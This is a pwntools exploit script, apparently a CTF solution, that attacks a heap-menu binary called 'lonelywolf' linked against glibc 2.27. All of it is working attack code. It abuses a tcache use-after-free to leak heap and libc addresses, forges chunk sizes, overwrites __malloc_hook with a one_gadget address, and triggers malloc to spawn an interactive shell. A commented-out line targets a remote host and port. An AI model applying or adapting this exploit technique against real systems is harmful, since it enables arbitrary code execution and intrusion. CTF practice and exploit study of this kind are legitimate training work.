from pwn import *

context.log_level = "debug"
p = process("./lonelywolf")
#p = remote("123.60.215.79","21937")
libc = ELF("./libc/libc-2.27.so")
one_gad = [0x4f3d5,0x4f432,0x10a41c]
def dbg():
    gdb.attach(p)
    pause()

def choice(num):
	p.sendlineafter("Your choice: ",str(num))

def add(size):
    choice(1)
    p.sendlineafter(":",str(0))
    p.sendlineafter(":",str(size))

def edit(context = "aaa"):
    choice(2)
    p.sendlineafter(":",str(0))
    p.sendlineafter(":",context)

def show():
    choice(3)
    p.sendlineafter(":",str(0))

def delete():
    choice(4)
    p.sendlineafter(":",str(0))


add(0x78)
add(0x78)
delete()

add(0x8)
delete()
edit("a"*8)
show()

p.recvuntil("aaaaaaaa")
leakaddr = u64(p.recv(6).ljust(8,"\x00"))

edit(p64(leakaddr+0x2e0-0x20))

add(0x10)
edit(p64(0) + p64(0x11))
add(0x10)

edit(p64(0) + p64(0x91))

add(0x78)
delete()
for i in range(6):
    edit(p64(0))
    delete()
edit(p64(0))
delete()

show()
p.recvuntil("Content: ")
__malloc_hook =  u64(p.recv(6).ljust(8,"\x00"))-0x70

libc_base = __malloc_hook - libc.sym["__malloc_hook"]

print (hex(libc_base))
one = one_gad[2] + libc_base

add(0x28)
delete()
edit(p64(__malloc_hook))
add(0x28)
add(0x28)
edit(p64(one))
#edit()
#dbg()

add(0x20)

p.interactive()